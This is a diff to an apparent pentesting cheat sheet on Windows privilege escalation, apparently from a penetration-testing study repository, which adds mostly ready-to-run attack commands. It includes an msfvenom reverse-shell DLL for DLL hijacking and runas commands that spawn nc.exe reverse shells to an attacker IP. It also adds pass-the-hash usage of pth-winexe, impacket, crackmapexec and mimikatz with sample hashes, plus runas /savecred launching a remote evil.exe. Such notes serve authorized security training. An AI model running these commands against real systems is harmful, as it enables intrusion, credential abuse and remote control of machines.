@@ -143,6 +143,7 @@ pkg_info
 **Tips**
 
 * :warning: Check Arch of your payloads! (e.g `PS > [Environment]::Is64BitProcess`). It might be the source of your problems.
+* **syswow64** lets you run 32 bit system executables from 64 bit code. **sysnative** lets you run 64 bit system executables from 32 bit code. Run powershell from 32 bits cmd.exe: `%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe`
 
 ## Enumeration
 
@@ -178,11 +179,18 @@ python pyinstaller.py --onefile exploit.py
 ```
 i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
 ```
+```
+i586-mingw32msvc-gcc -o adduser.exe useradd.c
+```
 
 ## Services
 
 ### Any services running as SYSTEM?
 * `tasklist /fi "USERNAME ne NT AUTHORITY\SYSTEM" /fi "STATUS eq running"`
+
+### Orphaned installs
+
+Not installed anymore but still exist in startup.
 
 ### Insecure File/Folder Permissions
 
@@ -219,9 +227,19 @@ When a process attempts to load a DLL, the system searches directories in the fo
 Steps in order to hijack a DLL:
 * Find processes running with higher privileges than ours.
 * Download an analyze binaries of these processes.
-* By reverse engineering a binary, locate DLLs names loaded **OR** use [Procmon](https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx) **OR** use enumeration scripts.
-* If it does not exist, place the malicious copy of DLL to one of the directories that I mentioned above. When process executed, it will find and load malicious DLL.
+* Identify DLL for each service with [Procmon](https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx)
+* If it does not exist (**NAME_NOT_FOUND**), place the malicious copy of DLL to one of the directories that I mentioned above. When process executed, it will find and load malicious DLL.
 * If the DLL file already exists in any of these paths, try to place malicious DLL to a directory with a higher priority than the directory where the original DLL file exists.
+
+Create an evil DLL:
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -a x86 > evil.dll
+```
+
+You can also use [Powersploit](https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Privesc/README.md):
+* Identify missing DLLS: Find-ProcessDLLHijack
+* Find path that the user can modify (M): Find-PathDLLHijack
+* Generate the hijackable DLL: Write-HijackDll
 
 
 ### AlwaysInstallElevated
@@ -328,19 +346,26 @@ shutdown /r /t 0
 
 ## PassTheHash
 
-* Use Windows Credentials Editor (WCE)
-
 * Set the SMBHASH environment variable and run `pth-winexe`
 ```
 export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
 pth-winexe -U administrator //10.11.01.76 cmd 
-
-OR
-
-pth-winexe --user=username/administrator%hash:hash --system //10.10.10.63 cmd.exe
-
-
 ```
+```
+pth-winexe --user=username/administrator%hash:hash --system //10.10.10.63 cmd.exe
+```
+
+* PsExec: `/usr/share/doc/python-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 jarrieta@10.2.0.2`
+
+* wmiexec.py: `/usr/local/bin/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 [[domain/]username[:password]@]<targetName or address> [command]`
+
+* [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec):
+```
+crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
+crackmapexec smb <target(s)> -u username -H NTHASH
+```
+
+* mimikatz: `mimikatz # sekurlsa::pth /user:USERNAME /domain:DOMAIN_NAME /ntlm:NTLM_HASH`
 
 * Remote Desktop: `xfreerdp /u:admin /d:win7 /pth:hash:hash /v:192.168.1.101`
 
@@ -371,6 +396,13 @@ Start-Process nc.exe -ArgumentList '-e cmd.exe 10.10.10.10 4444' -Credential $cr
 powershell -ExecutionPolicy Bypass -File runas.ps1
 ```
 
+### Crackmapexec
+
+```
+crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
+crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
+```
+
 ### CMD
 
 ```
@@ -394,10 +426,17 @@ pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe
 
 ### RunAs.exe
 
+Using runas with a provided set of credential
 ```
-C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
- Enter the password for Test:
- Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
+C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
+```
+```
+C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
+```
+
+You can use `runas` with the `/savecred` options in order to use the saved credentials. The following example is calling a remote binary via an SMB share:
+```
+runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 ```
 
 #### Powershell
@@ -486,6 +525,21 @@ Binary available at: https://github.com/ohpe/juicy-potato/releases
         [+] CreateProcessWithTokenW OK
     ```
 
+## From local administrator to NT SYSTEM
+
+* `PsExec.exe -i -s cmd.exe`
+
+## Insecure GUI apps
+
+Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.
+
+Example:
+* "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"
+
+## Common Vulnerabilities and Exposure
+
+* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5455c30ec7ef7aa4a4e17959709469941ada8379/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---common-vulnerabilities-and-exposure
+
 # References
 
 * https://ired.team/offensive-security-experiments/offensive-security-cheetsheets#post-exploitation-and-maintaining-access
@@ -494,3 +548,4 @@ Binary available at: https://github.com/ohpe/juicy-potato/releases
 * https://www.gracefulsecurity.com/privesc-insecure-service-permissions/
 * https://paper.dropbox.com/doc/OSCP-Methodology-EnVX7VSiNGZ2K2QxCZD7Q
 * https://labs.f-secure.com/assets/BlogFiles/mwri-windows-services-all-roads-lead-to-system-whitepaper.pdf
+* https://pentestlab.blog/2017/03/27/dll-hijacking/
